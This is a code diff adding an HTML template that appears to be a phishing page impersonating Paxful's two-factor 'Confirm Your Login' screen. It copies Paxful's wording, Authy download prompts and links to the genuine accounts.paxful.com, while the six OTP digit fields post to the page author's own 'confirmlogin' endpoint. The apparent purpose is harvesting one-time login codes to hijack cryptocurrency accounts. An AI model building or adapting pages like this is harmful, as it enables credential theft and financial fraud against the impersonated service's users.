@@ -1,0 +1,72 @@
+{%load static%}
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width= device-width, initial-scale= 1.0">
+    <link rel="stylesheet" href="{%static 'style.css'%}">
+
+    <link href="/static/dist/vendors.chunk.css?c=6d4312572de9d33c9855" rel="stylesheet" />
+        <link href="/static/dist/main.593036ead6f2ace2ad4b.css" rel="stylesheet" />
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Montserrat:400,500,700|Open+Sans:400,600,700&display=swap&subset=cyrillic"/>
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.jss">
+    <script src="{%static 'index.js'%}" defer></script>   
+</head>
+<body>
+    <div class="col-2b">
+        <div class="form-boxb">
+            <div class="box1">
+                <img width="125px" height="100px" src="{%static 'Images/logo.png'%}">
+            </div>
+            <div class="box2b">
+                <div class="img-container">
+                    <img id="ln-icon" width="14px" height="14px" src="{%static 'Images/global2.png'%}">
+                    <select id="select-ln">
+                        <option>English</option>
+                        <option>French</option>
+                     </select>
+              </div>      
+            </div>
+            </div>
+        <div class="form-body" style="margin-left: 25px;">
+        <p id="login-confmttl">Confirm Your Login</p>
+        <p id="code-p">Enter the code we've sent to your email below.</p>
+        <a id="trouble-a" href="https://accounts.paxful.com/reset-2fa/verify-email">Trouble logging in?</a><br>
+
+        <form method= "POST" action= "{% url 'confirmlogin' %}" id="otp-form">
+            {% csrf_token %}
+            <div class="otp-input">
+                <input type="number" pattern="[0-9]" name="otp_digit_1" maxlength="1" class="input-box" oninput="moveToNext(this)" onkeydown="handleBackspace(this, event)" required>
+                <input type="number" pattern="[0-9]" name="otp_digit_2" maxlength="1" class="input-box" oninput="moveToNext(this)" onkeydown="handleBackspace(this, event)" required>
+                <input type="number" pattern="[0-9]" name="otp_digit_3" maxlength="1" class="input-box" oninput="moveToNext(this)" onkeydown="handleBackspace(this, event)" required>
+                <input type="number" pattern="[0-9]" name="otp_digit_4" maxlength="1" class="input-box" oninput="moveToNext(this)" onkeydown="handleBackspace(this, event)" required>
+                <input type="number" pattern="[0-9]" name="otp_digit_5" maxlength="1" class="input-box" oninput="moveToNext(this)" onkeydown="handleBackspace(this, event)" required>
+                <input type="number" pattern="[0-9]" name="otp_digit_6" maxlength="1" class="input-box" oninput="moveToNext(this)" onkeydown="handleBackspace(this, event)" required>
+         </div>
+        </form>
+
+        <a id="resend-code" href="https://accounts.paxful.com/verification/">Resend code</a>
+        <div class="authy-source">
+        <div id="authy-block">
+        <p id="alt-header">Can't receive code now?</p>
+        <p id="authy-p"><a href="https://authy.com/download/">Install Authy</a> using your verified phone <br id="ln-break"> number for hasle-<br id="ln-break2">
+        free authentication</p>
+        </div>
+        <div id="app-sources">
+            <div class="app-col">
+                <a href="https://apps.apple.com/us/app/twilio-authy/id494168017"><img id="app-store" src="{%static 'Images/app-store1.png'%}"></a>
+            </div>
+            <div class="app-col2">
+                <a href="https://play.google.com/store/apps/details?id=com.authy.authy&pli=1"><img id="play-store" src="{%static 'Images/playstore.png'%}">
+            </div>
+        </div>
+        <a href="https://accounts.paxful.com/verification/"><button id="authy-install">I have installed Authy<i id="install-i" class="fa fa-chevron-right"></i></button><a>
+        </div>
+        <a id="backto-login" href="https://accounts.paxful.com/login/"><i id="chevron-left" class="fa fa-chevron-left"></i>Back to login</a>
+        </div>
+    </div>
+    <div class="col-23">
+            <img id="second-bg" src="{%static 'Images/secondBackground2.png'%}">
+    </div>
+</body>
+</html> 
